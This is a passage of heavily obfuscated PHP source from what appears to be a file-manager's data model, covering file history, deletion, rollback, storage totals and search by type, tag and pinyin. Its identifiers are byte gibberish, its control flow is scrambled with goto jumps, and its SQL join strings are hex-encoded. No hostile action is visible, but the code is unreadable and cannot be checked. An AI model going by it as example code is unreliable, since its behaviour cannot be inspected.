$A—‡Ë‘•ÊÕ[43], $A—‡Ë‘•ÊÕ[1427]); $B¥ÚˆÜ‘’ß = Model($A—‡Ë‘•ÊÕ[490])->userListInfo($EÈ‡ß¾ÂŸ‘); foreach ($d……Íæá as &$E˜º„ó°¶ñ) { $b‡÷äÌ‰ = $E˜º„ó°¶ñ[$A—‡Ë‘•ÊÕ[1427]]; $E˜º„ó°¶ñ[$A—‡Ë‘•ÊÕ[389]] = $B¥ÚˆÜ‘’ß[$b‡÷äÌ‰] ? $B¥ÚˆÜ‘’ß[$b‡÷äÌ‰] : !1; } } public function fileInfo($f×ÄºÄ¨·Ë) { $då­ˆ’‰Í =& $_SERVER[¹÷ˆ§éÒ°ú]; $Aù´¸Ä‘à = $this->tablePrefix; $DçÎåÆ¹Ò¸ = "{$Aù´¸Ä‘à}\x69\x6f\137\x66\x69\x6c\x65\x20\x66\151\154\145\163\40\157\156\40\146\x69\154\x65\x73\56\x66\151\x6c\x65\x49\104\x20\x3d\x20\150\151\163\164\157\162\x79\56\x66\x69\x6c\145\x49\x44"; return $this->alias($då­ˆ’‰Í[2320])->where(array($då­ˆ’‰Í[396] => $f×ÄºÄ¨·Ë))->join($DçÎåÆ¹Ò¸, $då­ˆ’‰Í[2321])->find(); } public function removeItem($bĞÎ¶†£›«) { $dÅÏó„ì‰å =& $_SERVER[¹÷ˆ§éÒ°ú]; $D‰£îõêµ‘ = array($dÅÏó„ì‰å[396] => $bĞÎ¶†£›«); $a¹ˆÉ°Òº– = $this->where($D‰£îõêµ‘)->find(); if ($a¹ˆÉ°Òº–) { $A¯Ù¾íô« = $this->where($D‰£îõêµ‘)->delete(); Model($dÅÏó„ì‰å[433])->remove($a¹ˆÉ°Òº–[$dÅÏó„ì‰å[430]]); return $A¯Ù¾íô«; } return !1; } public function removeBySource($d×Æã÷ÙŒ‹) { goto eÛœ±ƒçåÑ; eÛœ±ƒçåÑ: $C„­óê»§† =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$d×Æã÷ÙŒ‹) { return !1; } if (!is_array($d×Æã÷ÙŒ‹)) { $d×Æã÷ÙŒ‹ = array($d×Æã÷ÙŒ‹); } goto C¶ÂÌÃÀÜï; e‰¢ÄíˆÉÁ: return !0; goto c´²‰ÒŠÄ; C¶ÂÌÃÀÜï: $C­Ü¬ÄÑ´À = array($C„­óê»§†[394] => array($C„­óê»§†[17], $d×Æã÷ÙŒ‹)); $CÙ…‹Ç¥ëñ = $this->field($C„­óê»§†[431])->where($C­Ü¬ÄÑ´À)->select(); if ($CÙ…‹Ç¥ëñ) { $this->where($C­Ü¬ÄÑ´À)->delete(); $a‡Ñ¹ĞˆÛÜ = array_to_keyvalue($CÙ…‹Ç¥ëñ, $C„­óê»§†[43], $C„­óê»§†[430]); Model($C„­óê»§†[433])->remove($a‡Ñ¹ĞˆÛÜ); } goto e‰¢ÄíˆÉÁ; c´²‰ÒŠÄ: } public function setDetail($aïœ—–àË‚, $Aê¥ˆŒ‚ñÒ) { $DÌ°¨—º‚× =& $_SERVER[¹÷ˆ§éÒ°ú]; return $this->where(array($DÌ°¨—º‚×[396] => $aïœ—–àË‚))->save(array($DÌ°¨—º‚×[2309] => $Aê¥ˆŒ‚ñÒ)); } public function rollbackToItem($C‚È²±´‰í, $DëÕ‰°Á¿¥) { goto EÍ÷¯²Ï˜ƒ; EÍ÷¯²Ï˜ƒ: $BìÚŠ»ÖŒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AŞˆëï“­Ÿ = Model($BìÚŠ»ÖŒ[747])->sourceInfo($C‚È²±´‰í); $this->addHistory($AŞˆëï“­Ÿ); goto CØåÉ–…˜; CØåÉ–…˜: $A¼Ò­í¥ñ‚ = $this->find($DëÕ‰°Á¿¥); $d½ŞöÄîšğ = array($BìÚŠ»ÖŒ[430] => $A¼Ò­í¥ñ‚[$BìÚŠ»ÖŒ[430]], $BìÚŠ»ÖŒ[89] => $A¼Ò­í¥ñ‚[$BìÚŠ»ÖŒ[89]], $BìÚŠ»ÖŒ[119] => time(), $BìÚŠ»ÖŒ[390] => USER_ID); Model($BìÚŠ»ÖŒ[747])->where(array($BìÚŠ»ÖŒ[380] => $C‚È²±´‰í))->save($d½ŞöÄîšğ); goto fñÔ½ïõŠÔ; fñÔ½ïõŠÔ: return $this->where(array($BìÚŠ»ÖŒ[396] => $DëÕ‰°Á¿¥))->delete(); goto d°ª¶Úªºµ; d°ª¶Úªºµ: } public function clearSame($bŸì•Å¢) { goto b»éË‡ Ü©; b»éË‡ Ü©: $fÔèÁĞ´©ß =& $_SERVER[¹÷ˆ§éÒ°ú]; $Cö­§‰ƒ = $this->listData($bŸì•Å¢); $bÀù†Œ‰Ô¥ = array_to_keyvalue_group($Cö­§‰ƒ, $fÔèÁĞ´©ß[430]); goto F¼–Î—¬º; eŞÏ§é›£: if (!$BĞÚó’®ºŒ) { return; } $this->where(array($fÔèÁĞ´©ß[378] => array($fÔèÁĞ´©ß[17], $BĞÚó’®ºŒ)))->delete(); Model($fÔèÁĞ´©ß[433])->remove($BŒÌê¾â‘); goto DèÓ¥İ™©å; F¼–Î—¬º: $BŒÌê¾â‘ = array(); $BĞÚó’®ºŒ = array(); foreach ($bÀù†Œ‰Ô¥ as $e”½ªÃô¤Â) { if (!$e”½ªÃô¤Â || count($e”½ªÃô¤Â) <= 1) { continue; } foreach ($e”½ªÃô¤Â as $AÛÆñ…Ù„µ) { $BŒÌê¾â‘[] = $AÛÆñ…Ù„µ[$fÔèÁĞ´©ß[430]]; $BĞÚó’®ºŒ[] = $AÛÆñ…Ù„µ[$fÔèÁĞ´©ß[378]]; } } goto eŞÏ§é›£; DèÓ¥İ™©å: } public function userSpace() { $dŞÕÇ¡ó =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÆ¿°ÀíÇ = $this->tablePrefix; $eØëœÅË´ = array($dŞÕÇ¡ó[1418] => USER_ID); $B¶¤Ê¤ºëî = "{$FÆ¿°ÀíÇ}\x69\157\x5f\x66\151\x6c\145\40\146\151\154\x65\x73\x20\x6f\x6e\x20\x66\151\x6c\x65\163\x2e\x66\151\154\x65\x49\104\40\75\x20\x68\x69\163\164\x6f\162\171\56\x66\151\154\145\x49\x44"; return $this->alias($dŞÕÇ¡ó[2320])->where($eØëœÅË´)->join($B¶¤Ê¤ºëî, $dŞÕÇ¡ó[2321])->sum($dŞÕÇ¡ó[89]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($C„Úšá‚ø±) { goto d…µ‚è®ï; d…µ‚è®ï: $DØå ‚ºÑ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÀÔçÇ¯Ş = KodIO::fileTypeList(); $e£íêº°à• = $EÀÔçÇ¯Ş[$C„Úšá‚ø±]; goto FŒ„è¥²ÜÈ; FŒ„è¥²ÜÈ: if (!$e£íêº°à•) { return array(); } $b¢µ®œ‰½ø = $e£íêº°à•[$DØå ‚ºÑ[172]]; $BØò‰ÓöÉ™ = $DØå ‚ºÑ[17]; goto f¯ÑÜò¸; f¯ÑÜò¸: if (!$e£íêº°à•[$DØå ‚ºÑ[172]]) { $cŞ÷…Ö«ùÀ = array_to_keyvalue($EÀÔçÇ¯Ş, $DØå ‚ºÑ[43], $DØå ‚ºÑ[172]); $b¢µ®œ‰½ø = implode($DØå ‚ºÑ[57], $cŞ÷…Ö«ùÀ); $BØò‰ÓöÉ™ = $DØå ‚ºÑ[2272]; } $BŸÎ•Óà… = explode($DØå ‚ºÑ[57], trim($b¢µ®œ‰½ø, $DØå ‚ºÑ[57])); return array($BØò‰ÓöÉ™, $BŸÎ•Óà…); goto eä¥¹ÙÍ˜ğ; eä¥¹ÙÍ˜ğ: } public function listPathType($b‚äƒ©) { $DÁë¢â…èƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CØ»àœ¨¥‹ = $this->fileTypeWhere($b‚äƒ©); if (!$CØ»àœ¨¥‹) { return array(); } $d¿Ø¼ÇÂº = array($DÁë¢â…èƒ[534] => SourceModel::TYPE_USER, $DÁë¢â…èƒ[535] => USER_ID, $DÁë¢â…èƒ[531] => 0, $DÁë¢â…èƒ[532] => $CØ»àœ¨¥‹); return $this->listSource($d¿Ø¼ÇÂº); } public function listSearch($eõ¡¾õ¾ĞÙ, $B°¡ÑŠÃ…´ = 300) { goto DÊ•‚¡Ü¨®; FÑ§Ò­Ÿ‘: $this->_listSearchDesc($Eˆº‡Ş¡èŒ, $eõ¡¾õ¾ĞÙ, $cÉÈ†Í„±¡); $this->_listSearchTag($Eˆº‡Ş¡èŒ, $eõ¡¾õ¾ĞÙ, $cÉÈ†Í„±¡); $this->_listSearchGroupTag($Eˆº‡Ş¡èŒ, $eõ¡¾õ¾ĞÙ, $cÉÈ†Í„±¡); goto d³©Úòİõ„; B±‚¡ê˜×š: if (!isset($E÷êÓë¶•§[$b–°í¿ìãê[408]])) { $E÷êÓë¶•§[$b–°í¿ìãê[408]] = 0; } $C¶Ôš½÷² = $b–°í¿ìãê[2323]; $cÉÈ†Í„±¡ = $C¶Ôš½÷²; goto bˆ¤ø‰á¿ ; bˆ¤ø‰á¿ : $this->_listSearchBindPinyin($eõ¡¾õ¾ĞÙ, $E÷êÓë¶•§, $C¶Ôš½÷²); $this->alias($b–°í¿ìãê[500])->_makeOrder()->cache(null, 10); $Eˆº‡Ş¡èŒ = $this->distinct(!0)->field($C¶Ôš½÷²)->where($E÷êÓë¶•§)->selectPage($B°¡ÑŠÃ…´); goto FÑ§Ò­Ÿ‘; DÊ•‚¡Ü¨®: $b–°í¿ìãê =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset($eõ¡¾õ¾ĞÙ[$b–°í¿ìãê[2179]]) && $eõ¡¾õ¾ĞÙ[$b–°í¿ìãê[2179]]) { $eõ¡¾õ¾ĞÙ[$b–°í¿ìãê[2179]] = str_replace($b–°í¿ìãê[1583], $b–°í¿ìãê[2322], trim($eõ¡¾õ¾ĞÙ[$b–°í¿ìãê[2179]])); } $E÷êÓë¶•§ = $this->_parseSearchWhere($eõ¡¾õ¾ĞÙ); goto B±‚¡ê˜×š; d³©Úòİõ„: $this->_listDataApply($Eˆº‡Ş¡èŒ[$b–°í¿ìãê[365]]); $this->_listMake($Eˆº‡Ş¡èŒ); return $Eˆº‡Ş¡èŒ; goto eª¦Ö´„÷×; eª¦Ö´„÷×: } private function _listSearchTag(&$aØ¼ëŞªÇÇ, $d¡ö¨ŸŠöÕ, $A¤¶ªğÄ’£) { goto b½˜ô¥½•¬; bŠëŞ‘¢›Á: if (!$f£ŠÛš§¦) { return; } $FªÈğ›×ŸÍ = array($fÜïêÂ¼‘Ç[404] => array($fÜïêÂ¼‘Ç[17], $f£ŠÛš§¦), $fÜïêÂ¼‘Ç[1427] => USER_ID); $Dé‘äğ½§„ = Model($fÜïêÂ¼‘Ç[405])->field($fÜïêÂ¼‘Ç[87])->where($FªÈğ›×ŸÍ)->select(); goto E¬©†’„‚Ÿ; cŠäÚ‰¢Ñ·: $f£ŠÛš§¦ = array(); $càÔì‹éä = $d¡ö¨ŸŠöÕ[$fÜïêÂ¼‘Ç[2179]]; foreach ($Cñ´¾ÍòÏø as $båÙññ‹¨÷) { $F°Ÿò­¬õ‰ = $båÙññ‹¨÷[$fÜïêÂ¼‘Ç[38]]; $eùÖê‡Ç¾ = str_replace($fÜïêÂ¼‘Ç[60], $fÜïêÂ¼‘Ç[43], Pinyin::encode($F°Ÿò­¬õ‰)); if (stripos($F°Ÿò­¬õ‰, $càÔì‹éä) !== !1 || stripos($eùÖê‡Ç¾, $càÔì‹éä) !== !1) { $f£ŠÛš§¦[] = $båÙññ‹¨÷[$fÜïêÂ¼‘Ç[378]]; } } goto bŠëŞ‘¢›Á; E¬©†’„‚Ÿ: $Dé‘äğ½§„ = array_to_keyvalue($Dé‘äğ½§„, $fÜïêÂ¼‘Ç[43], $fÜïêÂ¼‘Ç[87]); $d³»†ƒÊÚĞ = array_unique($Dé‘äğ½§„); $this->_listSearchMerge($aØ¼ëŞªÇÇ, $d¡ö¨ŸŠöÕ, $A¤¶ªğÄ’£, $d³»†ƒÊÚĞ); goto CªŞšç´‡; b½˜ô¥½•¬: $fÜïêÂ¼‘Ç =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$d¡ö¨ŸŠöÕ[$fÜïêÂ¼‘Ç[2179]] || $aØ¼ëŞªÇÇ[$fÜïêÂ¼‘Ç[362]][$fÜïêÂ¼‘Ç[351]] > 1) { return; } $Cñ´¾ÍòÏø = Model($fÜïêÂ¼‘Ç[2324])->listData(); goto cŠäÚ‰¢Ñ·; CªŞšç´‡: } private function _listSearchDesc(&$a´ºçÅ…ÙÛ, $eªß„¡ªÒŞ, $f½ò©÷ªè‘) { goto CƒÑØ›ä©; EÂªâÅĞ: $AˆóÎ’Ñ‘™ = Model($aä„À¿‰“[517])->field($aä„À¿‰“[380])->where($Ağ’¢¨»øŠ)->select(); $eã…Œ¯Š®Ë = array_to_keyvalue($AˆóÎ’Ñ‘™, $aä„À¿‰“[43], $aä„À¿‰“[380]); $this->_listSearchMerge($a´ºçÅ…ÙÛ, $eªß„¡ªÒŞ, $f½ò©÷ªè‘, $eã…Œ¯Š®Ë); goto F‘Æ÷Ê‹â; CƒÑØ›ä©: $aä„À¿‰“ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$eªß„¡ªÒŞ[$aä„À¿‰“[2179]] || $a´ºçÅ…ÙÛ[$aä„À¿‰“[362]][$aä„À¿‰“[351]] > 1) { return; } $cç›Ä…‰š = $this->listSearchChildren($eªß„¡ªÒŞ[$aä„À¿‰“[474]]); goto FƒË†òß¯; FƒË†òß¯: $cç›Ä…‰š = array_unique($cç›Ä…‰š); if (!$cç›Ä…‰š) { return; } $Ağ’¢¨»øŠ = array($aä„À¿‰“[380] => array($aä„À¿‰“[17], $cç›Ä…‰š), $aä„À¿‰“[101] => $aä„À¿‰“[416], $aä„À¿‰“[370] => array($aä„À¿‰“[746], $aä„À¿‰“[2181] . $eªß„¡ªÒŞ[$aä„À¿‰“[2179]] . $aä„À¿‰“[2181])); goto EÂªâÅĞ; F‘Æ÷Ê‹â: } private function _listSearchGroupTag(&$Eß‚“™±ÛØ, $d®Ü½ò”“, $eÈ›Ï†Çè™) { goto a’À×¿¬Ê–; eÉÓ¥¡—’: $E™ÒŸËã˜ = array(); $BÑùÒ™×™ñ = $d®Ü½ò”“[$CØÖ‹Ú³šà[2179]]; foreach ($b“ĞŒƒôˆš[$CØÖ‹Ú³šà[365]] as $AåÙŠÙ¸š) { $DµËºå£õµ = $AåÙŠÙ¸š[$CØÖ‹Ú³šà[38]]; $F¶Œ²½œÁ· = str_replace($CØÖ‹Ú³šà[60], $CØÖ‹Ú³šà[43], Pinyin::encode($DµËºå£õµ)); if (stripos($DµËºå£õµ, $BÑùÒ™×™ñ) !== !1 || stripos($F¶Œ²½œÁ·, $BÑùÒ™×™ñ) !== !1) { $E™ÒŸËã˜[] = $AåÙŠÙ¸š[$CØÖ‹Ú³šà[378]]; } } goto EÒ—…ÍŞã•; a’À×¿¬Ê–: $CØÖ‹Ú³šà =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$d®Ü½ò”“[$CØÖ‹Ú³šà[2179]] || $Eß‚“™±ÛØ[$CØÖ‹Ú³šà[362]][$CØÖ‹Ú³šà[351]] > 1 || !$d®Ü½ò”“[$CØÖ‹Ú³šà[474]]) { return; } $fÛÃ‰Š¸Ş‚ = $this->sourceInfo($d®Ü½ò”“[$CØÖ‹Ú³šà[474]]); goto e™¥íœ¹Å; EÒ—…ÍŞã•: if (!$E™ÒŸËã˜) { return; } $dŒ»æø®¿² = array($CØÖ‹Ú³šà[404] => array($CØÖ‹Ú³šà[17], $E™ÒŸËã˜), $CØÖ‹Ú³šà[1427] => 0, $CØÖ‹Ú³šà[39] => $CØÖ‹Ú³šà[2199] . $a¡¸ùê»¦´); $A‰·Ä¯ÂêŒ = Model($CØÖ‹Ú³šà[405])->field($CØÖ‹Ú³šà[87])->where($dŒ»æø®¿²)->select(); goto CØğçÀˆôÌ; CØğçÀˆôÌ: $A‰·Ä¯ÂêŒ = array_to_keyvalue($A‰·Ä¯ÂêŒ, $CØÖ‹Ú³šà[43], $CØÖ‹Ú³šà[87]); $F¶ĞÎ¦®Ï = array_unique($A‰·Ä¯ÂêŒ); $this->_listSearchMerge($Eß‚“™±ÛØ, $d®Ü½ò”“, $eÈ›Ï†Çè™, $F¶ĞÎ¦®Ï); goto cìÈ¸º·èã; e™¥íœ¹Å: if (!$fÛÃ‰Š¸Ş‚ || $fÛÃ‰Š¸Ş‚[$CØÖ‹Ú³šà[382]] != SourceModel::TYPE_GROUP) { return; } $a¡¸ùê»¦´ = $fÛÃ‰Š¸Ş‚[$CØÖ‹Ú³šà[469]]; $b“ĞŒƒôˆš = Model($CØÖ‹Ú³šà[2325])->get($a¡¸ùê»¦´); goto eÉÓ¥¡—’; cìÈ¸º·èã: } private function _listSearchMerge(&$fàáŠ‹©, $eˆ²ñÎšê†, $F¦…Ôì´³·, $CÕöëö‘¥ˆ) { goto b“‰òŸƒ¤ª; bùßÆ¬™½’: $bÂ®Ô°Âè× = $this->field($F¦…Ôì´³·)->where($AŸ‘§‡Ì·¾)->select(); if (!$bÂ®Ô°Âè×) { return; } $D¸±à×±½é = array(); goto aòÕàîåòë; aòÕàîåòë: foreach ($bÂ®Ô°Âè× as $Fˆ…İä‡›é) { $DµÙä´ª• = $f·­ã‘ùİ[57] . $eˆ²ñÎšê†[$f·­ã‘ùİ[474]] . $f·­ã‘ùİ[57]; if (stripos($Fˆ…İä‡›é[$f·­ã‘ùİ[472]], $DµÙä´ª•) !== !1) { $D¸±à×±½é[] = $Fˆ…İä‡›é; } } $fàáŠ‹©[$f·­ã‘ùİ[365]] = array_merge($D¸±à×±½é, $fàáŠ‹©[$f·­ã‘ùİ[365]]); $fàáŠ‹©[$f·­ã‘ùİ[362]][$f·­ã‘ùİ[363]] += count($D¸±à×±½é); goto CáÒ¼±Šã‘; bóéÜÊëÉº: $aêŒ¢ç‘±™ = array_diff($CÕöëö‘¥ˆ, $e„‘Ãäåí); if (!$aêŒ¢ç‘±™) { return; } $AŸ‘§‡Ì·¾ = array($f·­ã‘ùİ[380] => array($f·­ã‘ùİ[17], $aêŒ¢ç‘±™)); goto bùßÆ¬™½’; b“‰òŸƒ¤ª: $f·­ã‘ùİ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$CÕöëö‘¥ˆ) { return; } $e„‘Ãäåí = array_to_keyvalue($fàáŠ‹©[$f·­ã‘ùİ[365]], $f·­ã‘ùİ[43], $f·­ã‘ùİ[380]); goto bóéÜÊëÉº; CáÒ¼±Šã‘: } public function listSearchChildren($AĞ»Ìë÷‡, $aõáÂÌ£¶© = 5000) { goto DÂõñÛÇ–Ù; fˆ­Ì²ËŞˆ: $aƒõÈ‡ŞŸÀ = array($a«¦Ú¾Ö¹Ö[472] => array($a«¦Ú¾Ö¹Ö[746], $e¡ƒ¯ö‰‚[$a«¦Ú¾Ö¹Ö[472]] . $e¡ƒ¯ö‰‚[$a«¦Ú¾Ö¹Ö[380]] . $a«¦Ú¾Ö¹Ö[497])); $F¹Š»¤ã™¸ = $this->field($a«¦Ú¾Ö¹Ö[380])->cache(null, 600)->where($aƒõÈ‡ŞŸÀ)->count(); if ($F¹Š»¤ã™¸ > $aõáÂÌ£¶©) { return $this->_listSearchChildrenNear($AĞ»Ìë÷‡, $aõáÂÌ£¶©); } goto a¨¡›¤ŠÈ‘; DÂõñÛÇ–Ù: $a«¦Ú¾Ö¹Ö =& $_SERVER[¹÷ˆ§éÒ°ú]; $F¢†˜¶óÊ = array(); $e¡ƒ¯ö‰‚ = $this->sourceInfo($AĞ»Ìë÷‡); goto fˆ­Ì²ËŞˆ; a¨¡›¤ŠÈ‘: $Eˆä¹Ì®  = $this->field($a«¦Ú¾Ö¹Ö[380])->where($aƒõÈ‡ŞŸÀ)->select(); $F¢†˜¶óÊ = array_to_keyvalue($Eˆä¹Ì® , $a«¦Ú¾Ö¹Ö[43], $a«¦Ú¾Ö¹Ö[380]); return $F¢†˜¶óÊ; goto eÁ¼Ü¾íÅ—; eÁ¼Ü¾íÅ—: } private function _listSearchChildrenNear($FöˆÌƒ¦®, $e“å»Ä‹Î½) { goto eêŒ¿‘Ï³; D®Ä±Œø³Ç: if (!$f·ƒ¹áÚ) { return $Cä÷áâÈÎù; } $E‚ÛêÊ½« = array($eŠôÊùÈ‚¸[474] => array($eŠôÊùÈ‚¸[17], $f·ƒ¹áÚ)); $aª‹Æø†Ø„ = $this->field($eŠôÊùÈ‚¸[2326])->where($E‚ÛêÊ½«)->select(); goto fáÜôÍ„àä; fáÜôÍ„àä: $Cä÷áâÈÎù = array_merge($Cä÷áâÈÎù, array_to_keyvalue($aª‹Æø†Ø„, $eŠôÊùÈ‚¸[43], $eŠôÊùÈ‚¸[380])); $Cä÷áâÈÎù = array_slice($Cä÷áâÈÎù, 0, $e“å»Ä‹Î½); return $Cä÷áâÈÎù; goto BŒÊ‡áêÃ¯; eêŒ¿‘Ï³: $eŠôÊùÈ‚¸ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Cä÷áâÈÎù = array(); $E‚ÛêÊ½« = array($eŠôÊùÈ‚¸[474] => $FöˆÌƒ¦®); goto c¾‘¶ÕÈîÕ; c¾‘¶ÕÈîÕ: $aª‹Æø†Ø„ = $this->field($eŠôÊùÈ‚¸[2326])->where($E‚ÛêÊ½«)->select(); $f·ƒ¹áÚ = array_to_keyvalue(array_filter_by_field($aª‹Æø†Ø„, $eŠôÊùÈ‚¸[381], $eŠôÊùÈ‚¸[95]), $eŠôÊùÈ‚¸[43], $eŠôÊùÈ‚¸[380]); $Cä÷áâÈÎù = array_merge($Cä÷áâÈÎù, array_to_keyvalue($aª‹Æø†Ø„, $eŠôÊùÈ‚¸[43], $eŠôÊùÈ‚¸[380])); goto D®Ä±Œø³Ç; BŒÊ‡áêÃ¯: } private function _listSearchBindPinyin($Cˆ­õÑˆÊ‚, &$A¤½±åí™‰, &$e«ŠàĞ—¢à) { goto a•‘„£Ü¼ ; a•‘„£Ü¼ : $dö¨‡ñ†âõ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!Input::check($Cˆ­õÑˆÊ‚[$dö¨‡ñ†âõ[2179]], $dö¨‡ñ†âõ[317]) || strlen($Cˆ­õÑˆÊ‚[$dö¨‡ñ†âõ[2179]]) < 2) { return; } $f¢‡åºÜƒ† = "\x4c\x45\x46\124\x20\112\x4f\111\116\40{$this->tablePrefix}\x69\x6f\x5f\x73\x6f\x75\162\x63\145\137\x6d\x65\164\x61\40\x6d\145\x74\141\x20\x6f\156\x20\163\157\165\x72\143\145\x2e\x73\x6f\165\x72\143\x65\111\104\40\x3d\x20\155\145\164\x61\x2e\163\x6f\x75\x72\143\x65\111\104"; goto Fô‚•ß—‘; Fô‚•ß—‘: $EÎ›ˆô»ã‹ = array(); $e«ŠàĞ—¢à = str_replace(array($dö¨‡ñ†âõ[10], $dö¨‡ñ†âõ[60], $dö¨‡ñ†âõ[2327]), $dö¨‡ñ†âõ[43], $e«ŠàĞ—¢à); $e«ŠàĞ—¢à = $dö¨‡ñ†âõ[2328] . str_replace($dö¨‡ñ†âõ[57], $dö¨‡ñ†âõ[2329], $e«ŠàĞ—¢à); goto C¶‹£ òáè; C¶‹£ òáè: unset($A¤½±åí™‰[$dö¨‡ñ†âõ[38]]); foreach ($A¤½±åí™‰ as $f›†ºä¢Œè => $b×¤°óù°¨) { $EÎ›ˆô»ã‹[$dö¨‡ñ†âõ[2328] . $f›†ºä¢Œè] = $b×¤°óù°¨; } $F“õÑ–Ì’‰ = array($dö¨‡ñ†âõ[496], $dö¨‡ñ†âõ[2181] . $Cˆ­õÑˆÊ‚[$dö¨‡ñ†âõ[2179]] . $dö¨‡ñ†âõ[2181]); goto Fƒ¶‹’; Fƒ¶‹’: $EÎ›ˆô»ã‹[] = array($dö¨‡ñ†âõ[2330] => $F“õÑ–Ì’‰, $dö¨‡ñ†âõ[904] => $dö¨‡ñ†âõ[2183], array($dö¨‡ñ†âõ[2331] => $F“õÑ–Ì’‰, $dö¨‡ñ†âõ[2332] => array($dö¨‡ñ†âõ[17], array($dö¨‡ñ†âõ[427], $dö¨‡ñ†âõ[426])))); $this->join($f¢‡åºÜƒ†); $A¤½±åí™‰ = $EÎ›ˆô»ã‹; goto aßà‹¾”Îê; aßà‹¾”Îê: } private function _parseSearchWhere($aÁøãîäÊ’) { goto C„‡Á¬; C„‡Á¬: $aÓİ’Ûƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fù¼¬µ‹îÍ = array(); if (isset($aÁøãîäÊ’[$aÓİ’Ûƒ[697]])) { $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[119]] = array($aÓİ’Ûƒ[2333], $aÁøãîäÊ’[$aÓİ’Ûƒ[697]]); } goto EŒÑ‘¢•µö; aµ†Å¦¼õ: if (isset($aÁøãîäÊ’[$aÓİ’Ûƒ[2179]]) && $aÁøãîäÊ’[$aÓİ’Ûƒ[2179]]) { $fÄ¸â…‚ò— = $aÁøãîäÊ’[$aÓİ’Ûƒ[2179]]; $eòÆ©Â†‰œ = explode($aÓİ’Ûƒ[60], $fÄ¸â…‚ò—); if (strlen($fÄ¸â…‚ò—) > 2 && (substr($fÄ¸â…‚ò—, 0, 1) == $aÓİ’Ûƒ[125] && substr($fÄ¸â…‚ò—, -1) == $aÓİ’Ûƒ[125]) || substr($fÄ¸â…‚ò—, 0, 1) == $aÓİ’Ûƒ[67] && substr($fÄ¸â…‚ò—, -1) == $aÓİ’Ûƒ[67]) { $fÄ¸â…‚ò— = substr($fÄ¸â…‚ò—, 1, -1); $eòÆ©Â†‰œ = array($fÄ¸â…‚ò—); } $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[38]] = array($aÓİ’Ûƒ[496], $aÓİ’Ûƒ[2181] . $fÄ¸â…‚ò— . $aÓİ’Ûƒ[2181]); if (count($eòÆ©Â†‰œ) > 1) { $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[38]] = array(); foreach ($eòÆ©Â†‰œ as $c—´ì¨˜) { if (!trim($c—´ì¨˜)) { continue; } $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[38]][] = array($aÓİ’Ûƒ[496], $aÓİ’Ûƒ[2181] . trim($c—´ì¨˜) . $aÓİ’Ûƒ[2181]); } } } return $Fù¼¬µ‹îÍ; goto b·ŞøÜÛ¡Û; EŒÑ‘¢•µö: if (isset($aÁøãîäÊ’[$aÓİ’Ûƒ[460]])) { $bêÈø»Ê¼ = array($aÓİ’Ûƒ[2334], $aÁøãîäÊ’[$aÓİ’Ûƒ[460]]); if ($Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[119]]) { $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[119]] = array($Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[119]], $bêÈø»Ê¼, $aÓİ’Ûƒ[2335]); } else { $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[119]] = $bêÈø»Ê¼; } } if (isset($aÁøãîäÊ’[$aÓİ’Ûƒ[2336]])) { $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[89]] = array($aÓİ’Ûƒ[2333], $aÁøãîäÊ’[$aÓİ’Ûƒ[2336]]); } if (isset($aÁøãîäÊ’[$aÓİ’Ûƒ[2337]])) { $bêÈø»Ê¼ = array($aÓİ’Ûƒ[2334], $aÁøãîäÊ’[$aÓİ’Ûƒ[2337]]); if ($Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[89]]) { $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[89]] = array($Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[89]], $bêÈø»Ê¼, $aÓİ’Ûƒ[2335]); } else { $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[89]] = $bêÈø»Ê¼; } } goto C£ÒÅÎŠ; C£ÒÅÎŠ: if (isset($aÁøãîäÊ’[$aÓİ’Ûƒ[548]])) { $Fù¼¬µ‹îÍ[] = array($aÓİ’Ûƒ[390] => $aÁøãîäÊ’[$aÓİ’Ûƒ[548]], $aÓİ’Ûƒ[389] => $aÁøãîäÊ’[$aÓİ’Ûƒ[548]], $aÓİ’Ûƒ[904] => $aÓİ’Ûƒ[2183]); } if (isset($aÁøãîäÊ’[$aÓİ’Ûƒ[383]])) { $bù¿†áŞ = $aÁøãîäÊ’[$aÓİ’Ûƒ[383]]; if ($bù¿†áŞ == $aÓİ’Ûƒ[88]) { $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[381]] = 1; } else { if ($bù¿†áŞ == $aÓİ’Ûƒ[2338]) { $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[381]] = 0; } else { if ($bù¿†áŞ) { $bù¿†áŞ = is_array($bù¿†áŞ) ? $bù¿†áŞ : explode($aÓİ’Ûƒ[57], $bù¿†áŞ); $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[383]] = array($aÓİ’Ûƒ[395], $bù¿†áŞ); $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[381]] = 0; } } } } if (isset($aÁøãîäÊ’[$aÓİ’Ûƒ[474]])) { $b‘±—¿Ø‘Ÿ = $this->sourceInfo($aÁøãîäÊ’[$aÓİ’Ûƒ[474]]); $Fù¼¬µ‹îÍ[$aÓİ’Ûƒ[538]] = array($aÓİ’Ûƒ[496], $b‘±—¿Ø‘Ÿ[$aÓİ’Ûƒ[472]] . $aÁøãîäÊ’[$aÓİ’Ûƒ[474]] . $aÓİ’Ûƒ[497]); } goto aµ†Å¦¼õ; 